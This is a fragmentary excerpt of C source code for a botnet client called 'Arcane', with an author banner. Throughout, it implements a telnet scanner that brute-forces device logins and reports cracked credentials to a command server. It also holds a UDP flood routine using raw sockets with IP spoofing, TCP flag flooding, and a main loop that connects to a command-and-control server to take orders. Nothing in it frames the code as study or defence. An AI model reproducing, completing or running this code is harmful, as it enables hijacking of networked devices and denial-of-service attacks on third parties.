/*
      ...
      d88888                                            
     d88P888                                            
    d88P 888 888d888 .d8888b  8888b.  88888b.   .d88b.  
   d88P  888 888P"  d88P"        "88b 888 "88b d8P  Y8b 
  d88P   888 888    888      .d888888 888  888 88888888 
 d8888888888 888    Y88b.    888  888 888  888 Y8b.     
d88P     888 888     "Y8888P "Y888888 888  888  "Y8888  
...
Twitter: @switchnets
Website: https://theswitcharchive.xyz
...
char *BusyBoxPayload = ""; // bb payload here (not needed but ye)
char *usernames[] = {
...
void rand_alphastr(uint8_t *str, int len) {
	const char alphaset[] = "xq6fh0jrwxiugrogtzqf5p28fnxlm5j"; //(randomize everytime you recompile) 31 chars
	while (len > 0) {
...
int recvLine(int socket, unsigned char *buf, int bufsize) {
	...
	cp = buf;
	while(bufsize-- > 1) {
		if(recv(switchCommStock, &tmpchr, 1, 0) != 1) {
			*cp = 0x00;
			return -1;
		}
		*cp++ = tmpchr;
...
void botnetTScan(int wait_usec, int maxfds) { //telnet scanner btw
					...
					if(read_until_response(fds[i].fd, wait_usec, fds[i].sockbuf, BUFFER_SIZE, advances2)) {
						...
						if(contains_fail(fds[i].sockbuf)) {
							...
							if(fds[i].complete == 2) {
								...
								botnetPrint(switchCommStock, "Arcane Bruteforced = %s [ %s:%s ]", get_telstate_host(&fds[i]), usernames[fds[i].usernameInd], passwords[fds[i].passwordInd]);
								advance_state(&fds[i], 7);
							}
						} else {
							reset_telstate(&fds[i]);
...
void sendUDP(unsigned char *target, int port, int timeEnd, int spoofit, int packetsize, int pollinterval, int sleepcheck, int sleeptime) {
	...
	if(spoofit == 32) {
		...
		if(!sockfd) {
			#ifdef PRINTS
			botnetPrint(switchCommStock, "Failed opening raw socket.");
			#endif
			return;
		}
		...
		if(setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof (tmp)) < 0)	{
			#ifdef PRINTS
			botnetPrint(switchCommStock, "Failed setting raw headers mode.");
			#endif
			return;
		}
		int counter = 50;
	...
	if(!strcmp(flags, "all")) {
		...
		while(pch) {
			if(!strcmp(pch, "syn")) {
				...
				#ifdef PRINTS
				botnetPrint(switchCommStock, "Invalid flag \"%s\"", pch);
				#endif
			}
			pch = strtok(NULL, ",");
		}
...
int initConnection() {
	...
	if(switchCommStock) { close(switchCommStock); switchCommStock = 0; } 
	...
	switchCommStock = socket(AF_INET, SOCK_STREAM, 0);
	if(!connectTimeout(switchCommStock, server, port, 30)) return 1;
	return 0;
}
int main(int argc, unsigned char *argv[]) {
	...
	while(1) {
		...
		botnetPrint(switchCommStock, "\e[0;97m[ \e[0;92mArcane \e[0;97m] [ \e[0;92m%s\e[0;97m ] Connected = \e[0;92m%s\e[0;97m  | Endian \e[0;92m%s  \e[0;97m| Device: \e[0;92m%s", getBuild(), inet_ntoa(ourIP), getEndianness(), getBuildz());
		CleanDevice();
		UpdateNameSrvs();
		char commBuf[4096];
		int got = 0;
		int i = 0;
		while((got = recvLine(switchCommStock, commBuf, 4096)) != -1) {
